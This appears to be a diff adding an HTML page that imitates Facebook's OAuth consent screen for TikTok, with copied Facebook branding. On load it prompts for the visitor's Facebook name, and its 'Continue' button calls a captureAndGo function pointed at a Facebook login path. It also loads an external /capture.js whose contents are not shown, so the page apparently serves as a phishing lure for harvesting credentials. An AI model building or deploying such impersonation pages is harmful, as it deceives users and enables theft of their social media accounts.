@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background: #1c1c1c;
+      color: #e4e6eb;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── Header ───────────────────────────────────── */
+    header {
+      background: #242526;
+      border-bottom: 1px solid #3a3b3c;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 16px;
+    }
+
+    .fb-logo {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: #1877f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .user-info {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .user-avatar {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #6a5acd, #8b7ab8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      flex-shrink: 0;
+    }
+
+    .user-avatar img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .user-name {
+      font-size: 15px;
+      font-weight: 600;
+      color: #e4e6eb;
+    }
+
+    /* ── Main ─────────────────────────────────────── */
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      padding: 24px 16px 0;
+      max-width: 480px;
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    /* ── App logos row ────────────────────────────── */
+    .app-logos {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 16px;
+    }
+
+    .logo-fb {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      background: #1877f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .logo-tiktok {
+      width: 44px;
+      height: 44px;
+      border-radius: 10px;
+      background: #010101;
+      border: 1px solid #3a3b3c;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .arrows-icon {
+      color: #b0b3b8;
+    }
+
+    /* ── Divider ──────────────────────────────────── */
+    .divider {
+      height: 1px;
+      background: #3a3b3c;
+      margin-bottom: 20px;
+    }
+
+    /* ── Access section ───────────────────────────── */
+    .access-heading {
+      font-size: 17px;
+      font-weight: 700;
+      color: #e4e6eb;
+      margin-bottom: 14px;
+    }
+
+    .access-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 10px;
+      font-size: 15px;
+      color: #e4e6eb;
+    }
+
+    .bullet {
+      color: #e4e6eb;
+      font-size: 18px;
+      line-height: 1.3;
+      flex-shrink: 0;
+    }
+
+    .view-access-btn {
+      display: inline-flex;
+      align-items: center;
+      margin-top: 14px;
+      padding: 6px 12px;
+      border: 1px solid #4a90d9;
+      border-radius: 6px;
+      background: none;
+      color: #4a90d9;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      font-family: inherit;
+    }
+    .view-access-btn:hover { background: rgba(74,144,217,.1); }
+
+    /* ── Spacer ───────────────────────────────────── */
+    .spacer { flex: 1; min-height: 40px; }
+
+    /* ── Bottom section ───────────────────────────── */
+    .bottom {
+      padding: 0 0 24px;
+      max-width: 480px;
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    .btn-continue {
+      width: 100%;
+      height: 52px;
+      background: #1877f2;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 17px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      margin-bottom: 10px;
+      transition: background 0.15s;
+    }
+    .btn-continue:hover { background: #166fe5; }
+
+    .btn-cancel {
+      width: 100%;
+      height: 52px;
+      background: #3a3b3c;
+      border: none;
+      border-radius: 8px;
+      color: #e4e6eb;
+      font-size: 17px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      margin-bottom: 16px;
+      transition: background 0.15s;
+    }
+    .btn-cancel:hover { background: #4a4b4c; }
+
+    .disclaimer {
+      font-size: 13px;
+      color: #b0b3b8;
+      text-align: center;
+      line-height: 1.6;
+      margin-bottom: 10px;
+    }
+
+    .disclaimer a {
+      color: #4a90d9;
+      text-decoration: none;
+    }
+    .disclaimer a:hover { text-decoration: underline; }
+
+    .policy-row {
+      text-align: center;
+      font-size: 13px;
+      color: #b0b3b8;
+    }
+
+    .policy-row a {
+      color: #4a90d9;
+      text-decoration: none;
+    }
+    .policy-row a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <div class="fb-logo">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="#fff">
+        <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.513c-1.491 0-1.956.93-1.956 1.886v2.267h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
+      </svg>
+    </div>
+    <div class="user-info">
+      <div class="user-avatar" id="avatarWrap">
+        <svg id="avatarSvg" width="36" height="36" viewBox="0 0 36 36">
+          <rect width="36" height="36" fill="#5a4fcf" rx="18"/>
+          <text id="avatarInitial" x="50%" y="54%" dominant-baseline="middle" text-anchor="middle" fill="#fff" font-size="14" font-family="Arial" font-weight="600">?</text>
+        </svg>
+      </div>
+      <span class="user-name" id="userName" title="Click to edit" style="cursor:pointer;border-bottom:1px dashed #555;" onclick="editName()">Your Name</span>
+    </div>
+  </header>
+
+  <!-- Main content -->
+  <main>
+
+    <!-- FB ↔ TikTok logos -->
+    <div class="app-logos">
+      <div class="logo-fb">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="#fff">
+          <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.513c-1.491 0-1.956.93-1.956 1.886v2.267h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
+        </svg>
+      </div>
+      <!-- Arrows icon -->
+      <svg class="arrows-icon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="17 1 21 5 17 9"/>
+        <path d="M3 11V9a4 4 0 0 1 4-4h14"/>
+        <polyline points="7 23 3 19 7 15"/>
+        <path d="M21 13v2a4 4 0 0 1-4 4H3"/>
+      </svg>
+      <div class="logo-tiktok">
+        <svg width="26" height="26" viewBox="0 0 32 32" fill="none">
+          <path d="M22.5 8c.28 1.64 1.3 3.07 2.5 3.8v3.2c-1.4-.04-2.74-.47-3.87-1.24v5.64c0 3.64-2.98 6.6-6.63 6.6A6.63 6.63 0 0 1 8 19.4c0-3.64 2.98-6.6 6.63-6.6.23 0 .45.01.67.04v3.26a3.36 3.36 0 0 0-.67-.07 3.4 3.4 0 0 0-3.4 3.37 3.4 3.4 0 0 0 3.4 3.37 3.4 3.4 0 0 0 3.4-3.37V8h3.47z" fill="white"/>
+        </svg>
+      </div>
+    </div>
+
+    <div class="divider"></div>
+
+    <p class="access-heading">TikTok is requesting access to:</p>
+
+    <div class="access-item">
+      <span class="bullet">•</span>
+      <span>Name and profile picture</span>
+    </div>
+
+    <button class="view-access-btn">View access</button>
+
+    <div class="spacer"></div>
+
+  </main>
+
+  <!-- Bottom buttons -->
+  <div class="bottom" style="padding: 0 16px 24px;">
+    <button class="btn-continue" id="continueBtn" onclick="captureAndGo('/auth/facebook/login')">Continue as ...</button>
+    <button class="btn-cancel" onclick="window.location.href='/login'">Cancel</button>
+
+    <p class="disclaimer">
+      By continuing, TikTok will receive ongoing access to the information that you share and Meta
+      will record when TikTok accesses it. <a href="#">Learn more</a> about this sharing and the settings that you have.
+    </p>
+
+    <p class="policy-row">
+      TikTok's <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a>
+    </p>
+  </div>
+
+  <script>
+    function applyName(name) {
+      if (!name) return;
+      const firstName = name.split(' ')[0];
+      document.getElementById('userName').textContent = name;
+      document.getElementById('continueBtn').textContent = 'Continue as ' + firstName;
+      document.getElementById('avatarInitial').textContent = name.charAt(0).toUpperCase();
+      localStorage.setItem('fbName', name);
+    }
+
+    function editName() {
+      const current = document.getElementById('userName').textContent;
+      const input = prompt('Enter your name:', current === 'Your Name' ? '' : current);
+      if (input && input.trim()) applyName(input.trim());
+    }
+
+    // Load saved name on page open
+    const saved = localStorage.getItem('fbName');
+    if (saved) {
+      applyName(saved);
+    } else {
+      // Prompt immediately on first load
+      const input = prompt('Enter your Facebook name:');
+      if (input && input.trim()) applyName(input.trim());
+    }
+  </script>
+  <script src="/capture.js"></script>
+</body>
+</html>
